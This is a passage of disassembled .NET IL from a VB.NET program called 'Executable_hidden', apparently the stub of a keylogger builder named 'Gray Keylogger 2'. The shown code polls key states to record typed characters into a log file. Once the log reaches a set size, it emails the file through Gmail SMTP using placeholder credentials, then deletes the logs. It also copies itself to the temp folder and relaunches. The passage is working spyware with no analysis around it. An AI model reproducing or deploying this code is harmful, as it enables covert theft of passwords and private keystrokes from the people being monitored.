    IL_0720:  brtrue.s   IL_0729

    IL_0722:  ldstr      "V"
    IL_0727:  br.s       IL_072e

    IL_0729:  ldstr      "v"
    IL_072e:  stsfld     object Executable_hidden.Module1::l
    IL_0733:  br         IL_09c1

    IL_0738:  ldc.i4.s   87
    IL_073a:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_073f:  ldc.i4.0
    IL_0740:  cgt.un
    IL_0742:  brfalse.s  IL_0762

    IL_0744:  ldloc.2
    IL_0745:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_074a:  brtrue.s   IL_0753

    IL_074c:  ldstr      "W"
    IL_0751:  br.s       IL_0758

    IL_0753:  ldstr      "w"
    IL_0758:  stsfld     object Executable_hidden.Module1::l
    IL_075d:  br         IL_09c1

    IL_0762:  ldc.i4.s   88
    IL_0764:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0769:  ldc.i4.0
    IL_076a:  cgt.un
    IL_076c:  brfalse.s  IL_078c

    IL_076e:  ldloc.2
    IL_076f:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0774:  brtrue.s   IL_077d

    IL_0776:  ldstr      "X"
    IL_077b:  br.s       IL_0782

    IL_077d:  ldstr      "x"
    IL_0782:  stsfld     object Executable_hidden.Module1::l
    IL_0787:  br         IL_09c1

    IL_078c:  ldc.i4.s   89
    IL_078e:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0793:  ldc.i4.0
    IL_0794:  cgt.un
    IL_0796:  brfalse.s  IL_07b6

    IL_0798:  ldloc.2
    IL_0799:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_079e:  brtrue.s   IL_07a7

    IL_07a0:  ldstr      "Y"
    IL_07a5:  br.s       IL_07ac

    IL_07a7:  ldstr      "y"
    IL_07ac:  stsfld     object Executable_hidden.Module1::l
    IL_07b1:  br         IL_09c1

    IL_07b6:  ldc.i4.s   90
    IL_07b8:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_07bd:  ldc.i4.0
    IL_07be:  cgt.un
    IL_07c0:  brfalse.s  IL_07e0

    IL_07c2:  ldloc.2
    IL_07c3:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_07c8:  brtrue.s   IL_07d1

    IL_07ca:  ldstr      "Z"
    IL_07cf:  br.s       IL_07d6

    IL_07d1:  ldstr      "z"
    IL_07d6:  stsfld     object Executable_hidden.Module1::l
    IL_07db:  br         IL_09c1

    IL_07e0:  ldc.i4     0xba
    IL_07e5:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_07ea:  ldc.i4.0
    IL_07eb:  cgt.un
    IL_07ed:  brfalse.s  IL_080d

    IL_07ef:  ldloc.3
    IL_07f0:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_07f5:  brtrue.s   IL_07fe

    IL_07f7:  ldstr      ";"
    IL_07fc:  br.s       IL_0803

    IL_07fe:  ldstr      ":"
    IL_0803:  stsfld     object Executable_hidden.Module1::l
    IL_0808:  br         IL_09c1

    IL_080d:  ldc.i4     0xbb
    IL_0812:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0817:  ldc.i4.0
    IL_0818:  cgt.un
    IL_081a:  brfalse.s  IL_083a

    IL_081c:  ldloc.3
    IL_081d:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0822:  brtrue.s   IL_082b

    IL_0824:  ldstr      "="
    IL_0829:  br.s       IL_0830

    IL_082b:  ldstr      "+"
    IL_0830:  stsfld     object Executable_hidden.Module1::l
    IL_0835:  br         IL_09c1

    IL_083a:  ldc.i4     0xbc
    IL_083f:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0844:  ldc.i4.0
    IL_0845:  cgt.un
    IL_0847:  brfalse.s  IL_0867

    IL_0849:  ldloc.3
    IL_084a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_084f:  brtrue.s   IL_0858

    IL_0851:  ldstr      ","
    IL_0856:  br.s       IL_085d

    IL_0858:  ldstr      "<"
    IL_085d:  stsfld     object Executable_hidden.Module1::l
    IL_0862:  br         IL_09c1

    IL_0867:  ldc.i4     0xbd
    IL_086c:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0871:  ldc.i4.0
    IL_0872:  cgt.un
    IL_0874:  brfalse.s  IL_0894

    IL_0876:  ldloc.3
    IL_0877:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_087c:  brtrue.s   IL_0885

    IL_087e:  ldstr      "-"
    IL_0883:  br.s       IL_088a

    IL_0885:  ldstr      "_"
    IL_088a:  stsfld     object Executable_hidden.Module1::l
    IL_088f:  br         IL_09c1

    IL_0894:  ldc.i4     0xbe
    IL_0899:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_089e:  ldc.i4.0
    IL_089f:  cgt.un
    IL_08a1:  brfalse.s  IL_08c1

    IL_08a3:  ldloc.3
    IL_08a4:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_08a9:  brtrue.s   IL_08b2

    IL_08ab:  ldstr      "."
    IL_08b0:  br.s       IL_08b7

    IL_08b2:  ldstr      ">"
    IL_08b7:  stsfld     object Executable_hidden.Module1::l
    IL_08bc:  br         IL_09c1

    IL_08c1:  ldc.i4     0xbf
    IL_08c6:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_08cb:  ldc.i4.0
    IL_08cc:  cgt.un
    IL_08ce:  brfalse.s  IL_08ee

    IL_08d0:  ldloc.3
    IL_08d1:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_08d6:  brtrue.s   IL_08df

    IL_08d8:  ldstr      "/"
    IL_08dd:  br.s       IL_08e4

    IL_08df:  ldstr      "\?"
    IL_08e4:  stsfld     object Executable_hidden.Module1::l
    IL_08e9:  br         IL_09c1

    IL_08ee:  ldc.i4     0xc0
    IL_08f3:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_08f8:  ldc.i4.0
    IL_08f9:  cgt.un
    IL_08fb:  brfalse.s  IL_091b

    IL_08fd:  ldloc.3
    IL_08fe:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0903:  brtrue.s   IL_090c

    IL_0905:  ldstr      "`"
    IL_090a:  br.s       IL_0911

    IL_090c:  ldstr      "~"
    IL_0911:  stsfld     object Executable_hidden.Module1::l
    IL_0916:  br         IL_09c1

    IL_091b:  ldc.i4     0xdb
    IL_0920:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0925:  ldc.i4.0
    IL_0926:  cgt.un
    IL_0928:  brfalse.s  IL_0945

    IL_092a:  ldloc.3
    IL_092b:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0930:  brtrue.s   IL_0939

    IL_0932:  ldstr      "["
    IL_0937:  br.s       IL_093e

    IL_0939:  ldstr      "{"
    IL_093e:  stsfld     object Executable_hidden.Module1::l
    IL_0943:  br.s       IL_09c1

    IL_0945:  ldc.i4     0xdc
    IL_094a:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_094f:  ldc.i4.0
    IL_0950:  cgt.un
    IL_0952:  brfalse.s  IL_096f

    IL_0954:  ldloc.3
    IL_0955:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_095a:  brtrue.s   IL_0963

    IL_095c:  ldstr      "\\"
    IL_0961:  br.s       IL_0968

    IL_0963:  ldstr      "|"
    IL_0968:  stsfld     object Executable_hidden.Module1::l
    IL_096d:  br.s       IL_09c1

    IL_096f:  ldc.i4     0xdd
    IL_0974:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_0979:  ldc.i4.0
    IL_097a:  cgt.un
    IL_097c:  brfalse.s  IL_0999

    IL_097e:  ldloc.3
    IL_097f:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_0984:  brtrue.s   IL_098d

    IL_0986:  ldstr      "]"
    IL_098b:  br.s       IL_0992

    IL_098d:  ldstr      "}"
    IL_0992:  stsfld     object Executable_hidden.Module1::l
    IL_0997:  br.s       IL_09c1

    IL_0999:  ldc.i4     0xde
    IL_099e:  call       int16 Executable_hidden.Module1::GetAsyncKeyState(int32)
    IL_09a3:  ldc.i4.0
    IL_09a4:  cgt.un
    IL_09a6:  brfalse.s  IL_09c1

    IL_09a8:  ldloc.3
    IL_09a9:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_09ae:  brtrue.s   IL_09b7

    IL_09b0:  ldstr      "'"
    IL_09b5:  br.s       IL_09bc

    IL_09b7:  ldstr      "\""
    IL_09bc:  stsfld     object Executable_hidden.Module1::l
    IL_09c1:  call       class Executable_hidden.My.MyComputer Executable_hidden.My.MyProject::get_Computer()
    IL_09c6:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_09cb:  ldsfld     object Executable_hidden.Module1::p
    IL_09d0:  ldsfld     object Executable_hidden.Module1::q
    IL_09d5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_09da:  ldsfld     object Executable_hidden.Module1::t
    IL_09df:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_09e4:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_09e9:  ldsfld     object Executable_hidden.Module1::l
    IL_09ee:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_09f3:  ldc.i4.1
    IL_09f4:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::WriteAllText(string,
                                                                                                                             string,
                                                                                                                             bool)
    IL_09f9:  ldnull
    IL_09fa:  stsfld     object Executable_hidden.Module1::l
    IL_09ff:  call       class Executable_hidden.My.MyComputer Executable_hidden.My.MyProject::get_Computer()
    IL_0a04:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0a09:  ldsfld     object Executable_hidden.Module1::p
    IL_0a0e:  ldsfld     object Executable_hidden.Module1::q
    IL_0a13:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0a18:  ldsfld     object Executable_hidden.Module1::t
    IL_0a1d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0a22:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0a27:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::FileExists(string)
    IL_0a2c:  brfalse    IL_0c03

    IL_0a31:  call       class Executable_hidden.My.MyComputer Executable_hidden.My.MyProject::get_Computer()
    IL_0a36:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0a3b:  ldsfld     object Executable_hidden.Module1::p
    IL_0a40:  ldsfld     object Executable_hidden.Module1::q
    IL_0a45:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0a4a:  ldsfld     object Executable_hidden.Module1::t
    IL_0a4f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0a54:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0a59:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::ReadAllText(string)
    IL_0a5e:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0a63:  conv.r8
    IL_0a64:  ldstr      "[logsize]"
    IL_0a69:  call       float64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToDouble(string)
    IL_0a6e:  ble.un     IL_0c03

    .try
    {
      IL_0a73:  ldsfld     object Executable_hidden.Module1::p
      IL_0a78:  ldsfld     object Executable_hidden.Module1::q
      IL_0a7d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0a82:  ldsfld     object Executable_hidden.Module1::t
      IL_0a87:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0a8c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0a91:  newobj     instance void [System]System.Net.Mail.Attachment::.ctor(string)
      IL_0a96:  stloc.s    V_5
      .try
      {
        IL_0a98:  newobj     instance void [System]System.Net.Mail.MailMessage::.ctor()
        IL_0a9d:  dup
        IL_0a9e:  ldstr      "[subject]"
        IL_0aa3:  callvirt   instance void [System]System.Net.Mail.MailMessage::set_Subject(string)
        IL_0aa8:  stloc.s    V_6
        .try
        {
          IL_0aaa:  ldstr      "[email]"
          IL_0aaf:  stloc.s    V_7
          IL_0ab1:  ldloc.s    V_6
          IL_0ab3:  callvirt   instance class [System]System.Net.Mail.MailAddressCollection [System]System.Net.Mail.MailMessage::get_To()
          IL_0ab8:  ldnull
          IL_0ab9:  ldstr      "Add"
          IL_0abe:  ldc.i4.1
          IL_0abf:  newarr     [mscorlib]System.Object
          IL_0ac4:  dup
          IL_0ac5:  ldc.i4.0
          IL_0ac6:  ldloc.s    V_7
          IL_0ac8:  stelem.ref
          IL_0ac9:  dup
          IL_0aca:  stloc.s    V_8
          IL_0acc:  ldnull
          IL_0acd:  ldnull
          IL_0ace:  ldc.i4.1
          IL_0acf:  newarr     [mscorlib]System.Boolean
          IL_0ad4:  dup
          IL_0ad5:  ldc.i4.0
          IL_0ad6:  ldc.i4.1
          IL_0ad7:  stelem.i1
          IL_0ad8:  dup
          IL_0ad9:  stloc.s    V_9
          IL_0adb:  ldc.i4.1
          IL_0adc:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                             class [mscorlib]System.Type,
                                                                                                                             string,
                                                                                                                             object[],
                                                                                                                             string[],
                                                                                                                             class [mscorlib]System.Type[],
                                                                                                                             bool[],
                                                                                                                             bool)
          IL_0ae1:  pop
          IL_0ae2:  ldloc.s    V_9
          IL_0ae4:  ldc.i4.0
          IL_0ae5:  ldelem.u1
          IL_0ae6:  brfalse.s  IL_0af3

          IL_0ae8:  ldloc.s    V_8
          IL_0aea:  ldc.i4.0
          IL_0aeb:  ldelem.ref
          IL_0aec:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_0af1:  stloc.s    V_7
          IL_0af3:  ldloc.s    V_6
          IL_0af5:  ldloc.s    V_7
          IL_0af7:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_0afc:  newobj     instance void [System]System.Net.Mail.MailAddress::.ctor(string)
          IL_0b01:  callvirt   instance void [System]System.Net.Mail.MailMessage::set_From(class [System]System.Net.Mail.MailAddress)
          IL_0b06:  ldloc.s    V_6
          IL_0b08:  ldstr      "[body]"
          IL_0b0d:  callvirt   instance void [System]System.Net.Mail.MailMessage::set_Body(string)
          IL_0b12:  ldloc.s    V_6
          IL_0b14:  callvirt   instance class [System]System.Net.Mail.AttachmentCollection [System]System.Net.Mail.MailMessage::get_Attachments()
          IL_0b19:  ldloc.s    V_5
          IL_0b1b:  castclass  [System]System.Net.Mail.Attachment
          IL_0b20:  callvirt   instance void class [mscorlib]System.Collections.ObjectModel.Collection`1<class [System]System.Net.Mail.Attachment>::Add(!0)
          IL_0b25:  ldstr      "smtp.gmail.com"
          IL_0b2a:  newobj     instance void [System]System.Net.Mail.SmtpClient::.ctor(string)
          IL_0b2f:  dup
          IL_0b30:  ldc.i4.1
          IL_0b31:  callvirt   instance void [System]System.Net.Mail.SmtpClient::set_EnableSsl(bool)
          IL_0b36:  dup
          IL_0b37:  ldloc.s    V_7
          IL_0b39:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_0b3e:  ldstr      "[password]"
          IL_0b43:  newobj     instance void [System]System.Net.NetworkCredential::.ctor(string,
                                                                                         string)
          IL_0b48:  callvirt   instance void [System]System.Net.Mail.SmtpClient::set_Credentials(class [System]System.Net.ICredentialsByHost)
          IL_0b4d:  dup
          IL_0b4e:  ldstr      "587"
          IL_0b53:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
          IL_0b58:  callvirt   instance void [System]System.Net.Mail.SmtpClient::set_Port(int32)
          IL_0b5d:  stloc.s    V_10
          .try
          {
            IL_0b5f:  ldloc.s    V_10
            IL_0b61:  ldloc.s    V_6
            IL_0b63:  callvirt   instance void [System]System.Net.Mail.SmtpClient::Send(class [System]System.Net.Mail.MailMessage)
            IL_0b68:  leave.s    IL_0b76

          }  // end .try
          finally
          {
            IL_0b6a:  ldloc.s    V_10
            IL_0b6c:  brfalse.s  IL_0b75

            IL_0b6e:  ldloc.s    V_10
            IL_0b70:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
            IL_0b75:  endfinally
          }  // end handler
          IL_0b76:  leave.s    IL_0b84

        }  // end .try
        finally
        {
          IL_0b78:  ldloc.s    V_6
          IL_0b7a:  brfalse.s  IL_0b83

          IL_0b7c:  ldloc.s    V_6
          IL_0b7e:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
          IL_0b83:  endfinally
        }  // end handler
        IL_0b84:  leave.s    IL_0b97

      }  // end .try
      finally
      {
        IL_0b86:  ldloc.s    V_5
        IL_0b88:  brfalse.s  IL_0b96

        IL_0b8a:  ldloc.s    V_5
        IL_0b8c:  castclass  [mscorlib]System.IDisposable
        IL_0b91:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_0b96:  endfinally
      }  // end handler
      IL_0b97:  leave.s    IL_0ba5

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0b99:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0b9e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0ba3:  leave.s    IL_0ba5

    }  // end handler
    IL_0ba5:  ldsfld     object Executable_hidden.Module1::q
    IL_0baa:  ldc.i4.1
    IL_0bab:  box        [mscorlib]System.Int32
    IL_0bb0:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                   object)
    IL_0bb5:  stsfld     object Executable_hidden.Module1::q
    IL_0bba:  ldsfld     object Executable_hidden.Module1::p
    IL_0bbf:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0bc4:  call       string[] [mscorlib]System.IO.Directory::GetFiles(string)
    IL_0bc9:  stloc.s    V_11
    IL_0bcb:  ldc.i4.0
    IL_0bcc:  stloc.s    V_12
    IL_0bce:  br.s       IL_0bfb

    IL_0bd0:  ldloc.s    V_11
    IL_0bd2:  ldloc.s    V_12
    IL_0bd4:  ldelem.ref
    IL_0bd5:  stloc.s    V_13
    IL_0bd7:  ldloc.s    V_13
    IL_0bd9:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_0bde:  brfalse.s  IL_0bf5

    .try
    {
      IL_0be0:  ldloc.s    V_13
      IL_0be2:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0be7:  leave.s    IL_0bf5

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0be9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0bee:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0bf3:  leave.s    IL_0bf5

    }  // end handler
    IL_0bf5:  ldloc.s    V_12
    IL_0bf7:  ldc.i4.1
    IL_0bf8:  add.ovf
    IL_0bf9:  stloc.s    V_12
    IL_0bfb:  ldloc.s    V_12
    IL_0bfd:  ldloc.s    V_11
    IL_0bff:  ldlen
    IL_0c00:  conv.i4
    IL_0c01:  blt.s      IL_0bd0

    IL_0c03:  ldloc.0
    IL_0c04:  ldc.i4.1
    IL_0c05:  add
    IL_0c06:  stloc.0
    IL_0c07:  ldloc.0
    IL_0c08:  ldc.i4     0xde
    IL_0c0d:  ble        IL_003c

    IL_0c12:  br         IL_0033

    IL_0c17:  ldstr      "temp"
    IL_0c1c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0c21:  ldstr      "\\"
    IL_0c26:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
    IL_0c2b:  callvirt   instance string [mscorlib]System.AppDomain::get_FriendlyName()
    IL_0c30:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0c35:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_0c3a:  brfalse.s  IL_0c5f

    IL_0c3c:  ldstr      "temp"
    IL_0c41:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0c46:  ldstr      "\\"
    IL_0c4b:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
    IL_0c50:  callvirt   instance string [mscorlib]System.AppDomain::get_FriendlyName()
    IL_0c55:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0c5a:  call       void [mscorlib]System.IO.File::Delete(string)
    IL_0c5f:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetExecutingAssembly()
    IL_0c64:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
    IL_0c69:  ldstr      "temp"
    IL_0c6e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0c73:  ldstr      "\\"
    IL_0c78:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
    IL_0c7d:  callvirt   instance string [mscorlib]System.AppDomain::get_FriendlyName()
    IL_0c82:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0c87:  call       void [mscorlib]System.IO.File::Move(string,
                                                             string)
    IL_0c8c:  ldc.i4     0x3e8
    IL_0c91:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0c96:  ldstr      "temp"
    IL_0c9b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0ca0:  ldstr      "\\"
    IL_0ca5:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
    IL_0caa:  callvirt   instance string [mscorlib]System.AppDomain::get_FriendlyName()
    IL_0caf:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0cb4:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
    IL_0cb9:  pop
    IL_0cba:  ret
  } // end of method Module1::Main

} // end of class Executable_hidden.Module1


// =============================================================

// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file C:\Users\root\Desktop\gray-keylogger-2-master\Gray Keylogger 2\Executable_hidden.res
